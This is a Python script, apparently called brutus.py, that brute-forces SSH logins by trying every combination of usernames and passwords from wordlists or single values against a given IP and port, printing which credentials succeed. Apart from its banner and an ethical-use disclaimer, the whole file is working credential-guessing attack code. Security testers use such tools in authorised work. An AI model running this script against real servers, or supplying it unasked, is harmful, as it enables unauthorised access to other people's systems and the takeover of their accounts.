#!/usr/bin/env python3

import asyncio
import asyncssh
import argparse
import ipaddress
import os

print('')
print('██████╗ ██████╗ ██╗   ██╗████████╗██╗   ██╗███████╗   ██████╗ ██╗   ██╗')
print('██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██║   ██║██╔════╝   ██╔══██╗╚██╗ ██╔╝')
print('██████╔╝██████╔╝██║   ██║   ██║   ██║   ██║███████╗   ██████╔╝ ╚████╔╝') 
print('██╔══██╗██╔══██╗██║   ██║   ██║   ██║   ██║╚════██║   ██╔═══╝   ╚██╔╝')  
print('██████╔╝██║  ██║╚██████╔╝   ██║   ╚██████╔╝███████║██╗██║        ██║')   
print('╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ ╚══════╝╚═╝╚═╝        ╚═╝')   
print('')
print('Brutus.py is a tool designed for security testing of SSH services. It allows users to test a single username and/or password, ')
print('or use wordlists for usernames and passwords to perform cluster bomb-style attacks - Created by p3qu0dd')
print('')
print('--------------------------------------------------------------------------------------------------------------------------------------')
print('')
print('DISCLAIMER:')
print('This tool is intended for ethical use only. The author assumes no responsibility for any misuse of this software. ')
print('Testing SSH services or any systems without explicit authorization is illegal and may result in criminal or civil penalties.')
print('')
print('--------------------------------------------------------------------------------------------------------------------------------------')
print('')

class PrettyFormatter(argparse.HelpFormatter):
    def __init__(self, prog):
        super().__init__(prog, max_help_position=55, width=125)
        

def check_ip_format(ip_string):
    try:
        ipaddress.ip_address(ip_string)
        return ip_string
    except ValueError:
        raise argparse.ArgumentTypeError("Invalid IP address!")

def check_port_format(port_number):
    try:
        port = int(port_number)
    except ValueError:
        raise argparse.ArgumentTypeError("Port must be a number!")

    if not (1 <= port <= 65535):
        raise argparse.ArgumentTypeError("Port must be between 1 and 65535!")
    return port

def check_file(file_path):
    if not os.path.isfile(file_path):
        raise argparse.ArgumentTypeError("Invalid file!")
    return file_path

def check_string(value):
    if os.path.isfile(value):
        raise argparse.ArgumentTypeError("Invalid argument! Cannot be a file!")
    return value

                                                               
def arguments():

    parser = argparse.ArgumentParser(usage = 'python3 brutus.py -i [TARGET IP] [OPTIONS]', formatter_class=PrettyFormatter)
    parser.add_argument('-i', '--ip', dest='host', metavar='<IP address>', type=check_ip_format, help='target IP address')
    parser.add_argument('-s', '--service', dest='port', metavar='<port>', type=check_port_format, help='target port (default 22)', default=22)
    parser.add_argument('-u', '--username', dest='user', metavar='<username>', type=check_string, help='username')
    parser.add_argument('-p', '--password', dest='passwd', metavar='<password>', type=check_string, help='password')
    parser.add_argument('-U', '--userlist', dest='users_list', metavar='<username list>', type=check_file, help='username list')
    parser.add_argument('-P', '--passlist', dest='passwords_list', metavar='<password list>', type=check_file, help='password list')
    parser.add_argument('--dont-stop', dest='dont_stop', action='store_true', help='keeps on searching even when a valid combination of credentials has been found')

    args = parser.parse_args()

    if not args.host:
        print('\n[-] Please specify a target IP - usage: python3 brutus.py -i [TARGET IP] [OPTIONS]')
    elif not args.user and not args.users_list:
        print('\n[-] Please specify a username or a user list - usage: python3 brutus.py -i [TARGET IP] [OPTIONS]')
    elif not args.passwd and not args.passwords_list:
        print('\n[-] Please specify a password or a password list - usage: python3 brutus.py -i [TARGET IP] [OPTIONS]')

    return args

args = arguments()

# PASSWORD LIST FUNCTION

passwords=[]

def pass_list(passwords_list_path):
    global passwords

    try:
        with open(passwords_list_path, 'r') as file:
            for line in file:
                password = line.strip()
                if password:
                    passwords.append(password)
    except FileNotFoundError:
        print('[!] Wordlist not found or invalid path')
        return []
    return passwords

if args.passwords_list:
    passwords = pass_list(args.passwords_list)

# SINGLE PASSWORD FUNCTION

def single_pass(passwd):
    global passwords
    passwords.append(passwd)
    return passwords

if args.passwd:
    passwords = single_pass(args.passwd)

# USERNAMES LIST FUNCTION

usernames=[]

def user_list(users_list_path):
    global usernames

    try:
        with open(users_list_path, 'r') as file:
            for line in file:
                username = line.strip()
                if username:
                    usernames.append(username)
    except FileNotFoundError:
        print('[!] Wordlist not found or invalid path!')
        return []
    return usernames

if args.users_list:
    usernames = user_list(args.users_list)

# SINGLE USERNAME FUNCTION

def single_username(user):
    global usernames
    usernames.append(user)
    return usernames

if args.user:
    usernames = single_username(args.user)

# SSH CONNECTION LOOP

async def ssh_login(host, port, passwords, usernames):
    for x in usernames: 
            for i in passwords:
                try:
                    async with asyncssh.connect(host=host, port=port, password=i, username=x) as conn:
                        if conn:
                            print('\033[92m[+] Testing password ' + '"' + i + '"' + ' for the user '  + '"' + x + '" - Valid password!\033[0m')
                            if args.dont_stop:
                                continue
                            return True
                        elif not conn:
                            continue
                except (asyncssh.ProcessError, asyncssh.PermissionDenied):
                    print('[-] Testing password ' + '"' + i + '"' + ' for the user '  + '"' + x + '" - Invalid password!')
                    continue
                except (OSError, asyncssh.Error) as e:
                    print('[!] Connection failed. Check the target\'s IP/Port!')
                    return False
            continue
    
try:
    asyncio.run(ssh_login(args.host, int(args.port), passwords, usernames))
except KeyboardInterrupt:
    print(' - [!] Stopped by the user! Goodbye!')




